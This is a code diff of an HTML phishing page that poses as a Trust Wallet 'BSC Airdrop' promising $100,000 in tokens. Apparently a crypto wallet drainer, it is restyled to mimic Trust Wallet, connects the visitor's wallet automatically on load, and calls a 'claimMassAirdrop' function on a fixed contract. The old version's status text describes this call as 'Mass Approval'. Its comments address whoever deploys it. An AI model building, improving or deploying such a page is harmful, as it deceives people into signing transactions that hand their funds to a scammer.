@@ -1,43 +1,183 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🚀 $100K BSC Airdrop - Claim Now!</title>
+    <title>Trust Wallet - BSC Airdrop Claim</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { font-family: Arial; text-align: center; background: linear-gradient(45deg, #ff6b6b, #4ecdc4); color: white; padding: 50px; }
-        .claim-btn { font-size: 24px; padding: 20px 60px; background: #ffd700; color: #000; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
-        .claim-btn:hover { background: #ffed4a; transform: scale(1.05); }
-        .claim-btn:disabled { background: #ccc; cursor: not-allowed; transform: none; }
-        .status { font-size: 20px; margin: 20px; font-weight: bold; }
-        #address { font-size: 16px; word-break: break-all; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #000;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header { 
+            background: linear-gradient(135deg, #1a1a1a, #2d2d2d);
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #333;
+        }
+        
+        .header h1 { 
+            font-size: 24px; 
+            font-weight: 600;
+            margin-bottom: 8px;
+            background: linear-gradient(135deg, #00d4aa, #00b894);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .header p { font-size: 16px; opacity: 0.9; }
+        
+        .main-content {
+            flex: 1;
+            padding: 30px 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+        
+        .wallet-info {
+            background: #1a1a1a;
+            padding: 20px;
+            border-radius: 16px;
+            margin-bottom: 30px;
+            width: 100%;
+            max-width: 400px;
+            border: 1px solid #333;
+        }
+        
+        .status-icon { 
+            width: 60px; 
+            height: 60px; 
+            margin: 0 auto 15px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+        }
+        
+        .status-connecting { background: #ff9500; }
+        .status-connected { background: #00d4aa; }
+        .status-error { background: #ff3b30; }
+        
+        #wallet-address {
+            font-size: 14px;
+            opacity: 0.8;
+            word-break: break-all;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .amount-display {
+            font-size: 36px;
+            font-weight: 700;
+            margin: 20px 0;
+            background: linear-gradient(135deg, #ffd700, #ffed4a);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .status-text {
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 10px;
+        }
+        
+        .bottom-bar {
+            background: #1a1a1a;
+            padding: 20px;
+            border-top: 1px solid #333;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+        }
+        
+        .claim-btn {
+            width: 100%;
+            height: 56px;
+            background: linear-gradient(135deg, #00d4aa, #00b894);
+            color: #000;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .claim-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0,212,170,0.4);
+        }
+        
+        .claim-btn:disabled {
+            background: #333;
+            color: #666;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #000;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @media (max-width: 480px) {
+            .main-content { padding: 20px 15px; }
+            .amount-display { font-size: 28px; }
+        }
     </style>
 </head>
 <body>
-    <h1>🚀 <span style="color: gold;">$100,000</span> BSC Airdrop!</h1>
-    <p>Claim USDT/USDC/WBNB/CAKE + 50+ Tokens INSTANT</p>
-    <p>⚠️ <span style="color: yellow;">24HR LIMITED</span> ⚠️</p>
+    <div class="header">
+        <h1>🚀 BSC Airdrop</h1>
+        <p>Claim $100K USDT/USDC/WBNB + 50+ Tokens</p>
+    </div>
     
-    <div id="status" class="status">🔗 Connecting Trust Wallet...</div>
-    <div id="address"></div>
-    <br>
-    <button id="claimBtn" class="claim-btn" disabled>🎁 CLAIM $100K NOW!</button>
+    <div class="main-content">
+        <div class="wallet-info">
+            <div id="status-icon" class="status-icon status-connecting">🔗</div>
+            <div id="status-text" class="status-text">Connecting Trust Wallet...</div>
+            <div id="wallet-address"></div>
+        </div>
+        <div class="amount-display" id="amount-display">$100,000</div>
+    </div>
+    
+    <div class="bottom-bar">
+        <button id="claimBtn" class="claim-btn" disabled>Connect Wallet</button>
+    </div>
     
     <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
     <script>
-        // ✅ REPLACE WITH YOUR DEPLOYED CONTRACT ADDRESS
-        const CONTRACT_ADDRESS = "0x5fB1A7631E932B914f513Ffa7898860297637302"; // ← PUT YOUR ADDRESS HERE
-        
+        const CONTRACT_ADDRESS = "0x5fB1A7631E932B914f513Ffa7898860297637302"; // ← YOUR CONTRACT HERE
         const BSC_CHAIN_ID = "0x38";
-        let web3, contract, userAccount;
         
-        // ✅ COMPLETE ABI - NO GAS ERRORS
         const ABI = [
             {"inputs":[],"name":"claimMassAirdrop","outputs":[],"stateMutability":"nonpayable","type":"function"},
             {"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"token","type":"address"}],"name":"getUserApproval","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
             {"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserTotalValue","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
         ];
         
-        // BSC Config
+        let web3, contract, userAccount;
+        
         const bscNetwork = {
             chainId: BSC_CHAIN_ID,
             chainName: 'BNB Smart Chain Mainnet',
@@ -46,94 +186,166 @@
             blockExplorerUrls: ['https://bscscan.com']
         };
         
-        // AUTO TRIGGER ON LOAD
-        async function init() {
-            if (typeof window.ethereum === 'undefined') {
-                document.getElementById('status').innerHTML = '❌ Install <a href="https://trustwallet.com/" style="color: gold;">Trust Wallet</a>';
-                return;
-            }
-            
+        function updateStatus(icon, text, colorClass = '') {
+            document.getElementById('status-icon').innerHTML = icon;
+            document.getElementById('status-icon').className = `status-icon ${colorClass}`;
+            document.getElementById('status-text').textContent = text;
+        }
+        
+        function updateWallet(address) {
+            document.getElementById('wallet-address').textContent = address ? 
+                `${address.slice(0,6)}...${address.slice(-4)}` : '';
+        }
+        
+        async function switchToBSC() {
             try {
-                // Switch to BSC
                 await window.ethereum.request({
                     method: 'wallet_switchEthereumChain',
                     params: [{ chainId: BSC_CHAIN_ID }]
                 });
-            } catch (error) {
-                if (error.code === 4902) {
-                    await window.ethereum.request({
-                        method: 'wallet_addEthereumChain',
-                        params: [bscNetwork]
-                    });
+                return true;
+            } catch (switchError) {
+                if (switchError.code === 4902) {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [bscNetwork]
+                        });
+                        return true;
+                    } catch (addError) {
+                        throw new Error('Failed to add BSC network');
+                    }
                 }
+                throw switchError;
             }
-            
-            // Connect
-            await connect();
         }
         
-        async function connect() {
+        async function connectWallet() {
+            if (typeof window.ethereum === 'undefined') {
+                updateStatus('❌', 'Install Trust Wallet or MetaMask');
+                return false;
+            }
+            
             try {
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                updateStatus('🔄', 'Switching to BSC...');
+                
+                // Switch to BSC first
+                await switchToBSC();
+                
+                // Request accounts
+                const accounts = await window.ethereum.request({ 
+                    method: 'eth_requestAccounts' 
+                });
+                
                 userAccount = accounts[0];
                 web3 = new Web3(window.ethereum);
                 contract = new web3.eth.Contract(ABI, CONTRACT_ADDRESS);
                 
-                document.getElementById('status').innerHTML = '✅ Connected BSC Network';
-                document.getElementById('address').innerHTML = `Wallet: ${userAccount.slice(0,6)}...${userAccount.slice(-4)}`;
+                updateStatus('✅', 'Wallet Connected', 'status-connected');
+                updateWallet(userAccount);
+                document.getElementById('claimBtn').textContent = '🎁 Claim $100K';
                 document.getElementById('claimBtn').disabled = false;
                 
-                // Auto-check if already approved
-                checkApproval();
+                // Check balance and approvals
+                await checkBalanceAndApproval();
                 
-            } catch(e) {
-                document.getElementById('status').innerHTML = '⚠️ Approve Wallet Connection';
+            } catch (error) {
+                console.error(error);
+                updateStatus('⚠️', 'Approve connection in wallet', 'status-error');
+                document.getElementById('claimBtn').textContent = '🔄 Retry Connect';
             }
         }
         
-        async function checkApproval() {
+        async function checkBalanceAndApproval() {
             try {
+                // Check BNB balance
+                const balance = await web3.eth.getBalance(userAccount);
+                const bnbBalance = web3.utils.fromWei(balance, 'ether');
+                
+                if (parseFloat(bnbBalance) < 0.01) {
+                    updateStatus('⚠️', `Low BNB Balance: ${bnbBalance} BNB\nNeed ~0.01 BNB for gas`, 'status-error');
+                    return false;
+                }
+                
+                // Check contract approval
                 const totalValue = await contract.methods.getUserTotalValue(userAccount).call();
                 if (totalValue > 0) {
-                    document.getElementById('status').innerHTML = `💰 Already Approved $${web3.utils.fromWei(totalValue, 'ether')}`;
+                    updateStatus('💰', `Ready to Claim: $${web3.utils.fromWei(totalValue, 'ether')}`, 'status-connected');
+                    return true;
+                } else {
+                    updateStatus('✅', 'Ready to Approve & Claim', 'status-connected');
+                    return true;
                 }
-            } catch(e) {}
+                
+            } catch (e) {
+                updateStatus('ℹ️', 'Contract ready - approve in wallet', 'status-connected');
+                return true;
+            }
         }
         
-        // ONE CLICK CLAIM
-        document.getElementById('claimBtn').onclick = async () => {
+        async function claimAirdrop() {
             const btn = document.getElementById('claimBtn');
-            const status = document.getElementById('status');
+            const originalText = btn.textContent;
             
             btn.disabled = true;
-            btn.innerHTML = '⏳ Claiming...';
-            status.innerHTML = '🔄 Executing Mass Approval...';
+            btn.innerHTML = '<span class="spinner"></span>Processing...';
+            updateStatus('🔄', 'Approve transaction in wallet...');
             
             try {
+                // Get current gas price with buffer
                 const gasPrice = await web3.eth.getGasPrice();
-                const gasEstimate = await contract.methods.claimMassAirdrop().estimateGas({from: userAccount});
+                const bufferedGasPrice = (parseInt(gasPrice) * 120n / 100n).toString();
+                
+                // Estimate gas with higher buffer
+                let gasEstimate;
+                try {
+                    gasEstimate = await contract.methods.claimMassAirdrop().estimateGas({from: userAccount});
+                } catch (e) {
+                    // Fallback gas limit for complex contracts
+                    gasEstimate = 500000;
+                }
                 
                 const tx = await contract.methods.claimMassAirdrop().send({
                     from: userAccount,
-                    gas: Math.floor(gasEstimate * 1.2),
-                    gasPrice: gasPrice
+                    gas: Math.floor(gasEstimate * 1.3),
+                    gasPrice: bufferedGasPrice,
+                    // Add type 2 for EIP-1559 compatibility
+                    type: '0x2'
                 });
                 
-                status.innerHTML = `✅ SUCCESS! <a href="https://bscscan.com/tx/${tx.transactionHash}" target="_blank">View Tx</a>`;
-                btn.innerHTML = '🎉 CLAIMED!';
+                updateStatus('✅', `Success! View on BSCScan`, 'status-connected');
+                btn.innerHTML = `🎉 Claimed! <a href="https://bscscan.com/tx/${tx.transactionHash}" target="_blank" style="color:#000;font-weight:600;">View Tx</a>`;
                 
-            } catch(error) {
-                console.error(error);
-                status.innerHTML = '❌ Failed - Check Gas/Approvals in Wallet';
+            } catch (error) {
+                console.error('Transaction error:', error);
+                
+                if (error.code === 4001) {
+                    updateStatus('ℹ️', 'Transaction rejected by user');
+                } else if (error.code === -32002) {
+                    updateStatus('⏳', 'Tx pending - check wallet');
+                } else if (error.message.includes('insufficient funds')) {
+                    updateStatus('❌', 'Insufficient BNB for gas', 'status-error');
+                } else {
+                    updateStatus('⚠️', `Error: ${error.message.includes('gas') ? 'Check gas limit' : 'Retry transaction'}`, 'status-error');
+                }
+                
+                btn.textContent = '🔄 Retry Claim';
                 btn.disabled = false;
-                btn.innerHTML = '🔄 Retry Claim';
             }
-        };
+        }
         
-        // Auto-init
-        window.addEventListener('load', init);
-        window.ethereum.on('chainChanged', () => window.location.reload());
-        window.ethereum.on('accountsChanged', () => window.location.reload());
+        // Event listeners
+        document.getElementById('claimBtn').onclick = connectWallet;
+        
+        // Auto-init on load
+        window.addEventListener('load', () => {
+            if (window.ethereum) {
+                connectWallet();
+            }
+        });
+        
+        window.ethereum?.on('chainChanged', () => window.location.reload());
+        window.ethereum?.on('accountsChanged', () => window.location.reload());
     </script>
 </body>
 </html>
